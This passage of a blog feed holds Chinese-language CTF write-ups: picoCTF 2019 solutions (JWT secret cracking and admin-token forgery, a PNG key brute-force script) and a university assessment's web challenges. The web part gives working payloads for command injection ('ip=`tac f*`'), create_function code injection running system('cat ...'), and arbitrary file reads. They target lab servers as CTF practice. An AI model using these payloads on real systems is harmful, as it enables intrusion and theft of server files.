dictionary...</span><br><span class="line">[*] Tested 1 million passwords so far</span><br><span class="line">[*] Tested 2 million passwords so far</span><br><span class="line">[*] Tested 3 million passwords so far</span><br><span class="line">[*] Tested 4 million passwords so far</span><br><span class="line">[*] Tested 5 million passwords so far</span><br><span class="line">[*] Tested 6 million passwords so far</span><br><span class="line">[*] Tested 7 million passwords so far</span><br><span class="line"></span><br><span class="line">[+] ilovepico is the CORRECT key!</span><br></pre></td></tr></table></figure><p>然后去jwt官网生成一个user位admin的假令牌<br><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s</span><br></pre></td></tr></table></figure><p>将token替换cookie后刷新页面<br><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}</p><h2 id="Java-Script-Kiddie-Points-400"><a href="#Java-Script-Kiddie-Points-400" class="headerlink" title="Java Script Kiddie - Points: 400"></a>Java Script Kiddie - Points: 400</h2><blockquote><p>The image link appears broken… <a href="https://2019shell1.picoctf.com/problem/37330" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37330</a> or <a href="http://2019shell1.picoctf.com:37330" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37330</a><br>Hints: This is only a JavaScript problem.</p></blockquote><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"0000000000000000"</span>;</span><br><span class="line"><span class="keyword">var</span> shifter;</span><br><span class="line"><span class="keyword">if</span>(u_in.length == LEN)&#123;</span><br><span class="line">key = u_in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">shifter = key.charCodeAt(i) - <span class="number">48</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去到 bytes 页面,看到一大串十六进制码,用大佬的脚本将bytes还原成图片跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">'254 80 209 18 188 10 188 243 2 53 69 13 255 180 221 188 56 0 2 132 0 0 243 69 252 53 190 137 64 58 147 202 185 0 183 59 13 73 155 10 253 206 63 173 96 191 230 0 158 16 59 127 0 2 73 114 156 135 33 73 73 139 237 82 243 61 0 123 165 30 26 65 191 1 255 89 0 223 223 108 241 218 78 194 148 168 1 164 78 68 228 221 155 27 0 219 137 156 1 181 32 138 68 55 0 0 87 205 161 130 68 35 0 231 0 239 170 183 188 48 1 0 174 247 252 72 95 89 164 167 69 0 248 191 37 31 84 120 0 66 45 192 110 204 48 73 82 71 136 239 50 29 128 28 0 13 231 65 208 222 5 235 32 114 56 173 229 159 144 150 156 0 215 111 72 205 113 237 25 2 249 225 102 227 179 160 192 237 243 46 64 75 144 116 157 223 177 55 50 199 95 194 6 71 60 62 119 65 121 6 13 110 161 145 214 235 228 254 77 104 223 157 52 254 107 103 146 14 147 193 85 227 36 73 193 243 119 225 119 75 4 175 65 155 210 113 127 182 252 202 98 121 191 107 3 4 210 41 235 255 235 91 214 199 222 86 35 102 55 84 231 223 98 32 192 245 234 66 251 37 113 254 252 216 141 196 24 226 186 214 150 110 166 1 158 221 252 186 143 212 161 193 192 114 202 76 51 164 196 45 126 226 246 54 159 243 225 81 206 117 197 208 207 212 247 210 239 217 32 152 252 248 251 253 118 252 82 223 31 117 134 139 117 56 190 250 5 188 115 65 130 10 143 158 91 134 186 126 193 198 159 126 14 178 87 130 52 16 117 131 252 51 137 244 244 84 186 186 239 34 30 237 239 253 71 88 61 219 76 13 22 203 68 28 231 226 111 212 124 105 69 242 21 207 189 141 145 233 191 46 28 239 197 219 96 196 100 222 195 7 54 235 246 65 222 32 1 199 249 73 55 245 206 31 191 55 45 99 136 112 208 16 223 66 120 182 2 213 12 87 131 150 243 144 211 215 233 73 150 238 211 134 96 55 32 244 128 152 229 31 96 44 169 108 207 249 115 136 224 65 235 39 213 219 99 255 242 168 239 179 100 6 206 239 251 181 99 136 72 122 31 222 65 228 16 105 164 11 115 246 34 195 159 124 49 44 190 44 134 252 248 220 86 199 91 57 98 190 185 227 171 120 214 106 11 24 187 189 124 249 197 4 98 33 250 109 59 127 114 125 152 200 121 0 163 170 143 127 80 242 222 51 157 143 223 215 196 70 99 161 55 252 98 145 120 227 53 9 17 0 253 197 181 254 124 254 218 253 186 17 171 99 226 146 94 70 13 188 175 233 233 165 86 111 108 210 235 56 115 157 241 127 209 251 48 169 15 81 190 10 157 243 193 214 243 126 225 189 105 31 27 75 29 234 223 118 31 213 73 246 80 245 210 11 159 127 104 237 90 63 170 74 115 149 220 167 231 31 180 162 127 239 88 97 113 126 180 111 108 239 109 167 106 15 143 117 107 113 39 79 171 139 82 157 166 191 191 254 79 129 255 241 211 27 175 125 98 85 93 253 90 154 107 227 250 206 245 64 205 243 244 87 180 172 231 190 235 78 75 25 206 196 59 247 162 0 252 254 90 158 215 159 154 102 236 234'</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{cad9a05f668a0c9d2543a9867a998cbd}</p><h2 id="Java-Script-Kiddie-2-Points-450"><a href="#Java-Script-Kiddie-2-Points-450" class="headerlink" title="Java Script Kiddie 2 - Points: 450"></a>Java Script Kiddie 2 - Points: 450</h2><blockquote><p>The image link appears broken… twice as badly… <a href="https://2019shell1.picoctf.com/problem/49893" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49893</a> or <a href="http://2019shell1.picoctf.com:49893" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49893</a><br>Hints: This is only a JavaScript problem.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"00000000000000000000000000000000"</span>;</span><br><span class="line"><span class="keyword">var</span> shifter;</span><br><span class="line"><span class="keyword">if</span>(u_in.length == key.length)&#123;</span><br><span class="line">key = u_in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">shifter = Number(key.slice((i*<span class="number">2</span>),(i*<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用第一题的脚本依旧可以跑出来flag<br><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>picoCTF{9e8a320ce2243468099aaf4047094320}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一般技能-General-Skills&quot;&gt;&lt;a href=&quot;#一般技能-General-Skills&quot; class=&quot;headerlink&quot; title=&quot;一般技能(General Skills)&quot;&gt;&lt;/a&gt;一般技能(General Skills)&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Damya大二上考核题目wp记录</title>
    <link href="https://www.damyahome.github.io/Damya%E5%A4%A7%E4%BA%8C%E4%B8%8A%E8%80%83%E6%A0%B8%E9%A2%98%E7%9B%AEwp%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.damyahome.github.io/Damya%E5%A4%A7%E4%BA%8C%E4%B8%8A%E8%80%83%E6%A0%B8%E9%A2%98%E7%9B%AEwp%E8%AE%B0%E5%BD%95/</id>
    <published>2019-12-03T07:54:04.000Z</published>
    <updated>2019-12-03T08:27:30.043Z</updated>
    
    <content type="html"><![CDATA[<p>内网地址: <a href="http://172.17.135.48:8000/challenges" target="_blank" rel="noopener">http://172.17.135.48:8000/challenges</a></p><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>序列化字符,base64解出是 guest_img.png,查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">print_r($_SESSION[<span class="string">"user"</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">print_r($_SESSION[<span class="string">'function'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode($_GET[<span class="string">'img_path'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">print_r($_SESSION[<span class="string">'img'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">print_r($serialize_info);</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    print_r($userinfo);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示,构造 <code>?f=phpinfo</code> 查看<code>phpinfo()</code>页面,发现被禁用了以下函数(没啥用),基本所有读文件命令都可以用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm</span><br><span class="line">pcntl_fork</span><br><span class="line">pcntl_waitpid</span><br><span class="line">pcntl_wait</span><br><span class="line">pcntl_wifexited</span><br><span class="line">pcntl_wifstopped</span><br><span class="line">pcntl_wifsignaled</span><br><span class="line">pcntl_wifcontinued</span><br><span class="line">pcntl_wexitstatus</span><br><span class="line">pcntl_wtermsig</span><br><span class="line">pcntl_wstopsig</span><br><span class="line">pcntl_signal</span><br><span class="line">pcntl_signal_get_handler</span><br><span class="line">pcntl_signal_dispatch</span><br><span class="line">pcntl_get_last_error</span><br><span class="line">pcntl_strerror</span><br><span class="line">pcntl_sigprocmask</span><br><span class="line">pcntl_sigwaitinfo</span><br><span class="line">pcntl_sigtimedwait</span><br><span class="line">pcntl_exec</span><br><span class="line">pcntl_getpriority</span><br><span class="line">pcntl_setpriority</span><br><span class="line">pcntl_async_signals</span><br></pre></td></tr></table></figure></p><p>接着构造 <code>?f=show_image</code> ，显示出一串列表<br><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>因为尝试构造<code>function=flag.php</code>时发现是双重编码,怀疑<code>flag.php</code>有东西,所以查看flag.php,果然页面上有提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flah=<span class="string">"flag&#123;flag_in_/flag-Pdsdt.txt&#125;"</span>; <span class="keyword">echo</span> <span class="string">"I am the faker flag"</span>;</span><br></pre></td></tr></table></figure><p>回头审计代码,发现还传入了一个 img_path 变量,构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?f=show_image&amp;img_path=/flag-Pdsdt.txt</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{5YiY6L2p5oiQ5ZOl5ZOl5bim5bim5oiR5ZCn}</p><h1 id="ping-No-ping"><a href="#ping-No-ping" class="headerlink" title="ping?No ping!"></a>ping?No ping!</h1><p>用之前做过的靶场的payload一打</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?ip=`tac%<span class="number">20</span>f*`</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>暂时想不出什么办法读取文件,于是从头开始,ls看下目录</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看<code>hint.php</code>,发现可以传入一个shell变量</p><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>百度搜到<code>create_fuction()</code>函数存在注入漏洞,可以通过闭合php语句执行下一条命令,于是尝试构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php?shell=<span class="number">1</span>;&#125;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>发现有回显,于是用<code>system()</code>函数读取文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php?shell=<span class="number">1</span>;&#125;system(<span class="string">'cat /flag-Pdsdt.txt'</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{e58898e8bda9e688904e49554249e597b7}</p><h1 id="baby-反序列化"><a href="#baby-反序列化" class="headerlink" title="baby_反序列化"></a>baby_反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure><p>base64解码得到 shield.jpg ,php伪协议读不出别的页面源码,但是<code>showimg.php</code>的源代码里有点东西,所以根据hint提示使用img=一串base64来进行文件读取,尝试读取flag.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showimg.php?img=ZmxhZy5waHA=</span><br></pre></td></tr></table></figure></p><p>在源码里发现注释<br><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>flag{you_are_killd_unsearize}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;内网地址: &lt;a href=&quot;http://172.17.135.48:8000/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.17.135.48:8000/challenges&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>wfuzz实战操作!</title>
    <link href="https://www.damyahome.github.io/wfuzz%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C/"/>
    <id>https://www.damyahome.github.io/wfuzz%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C/</id>
    <published>2019-11-21T12:49:05.000Z</published>
    <updated>2019-11-21T13:14:20.766Z</updated>
    
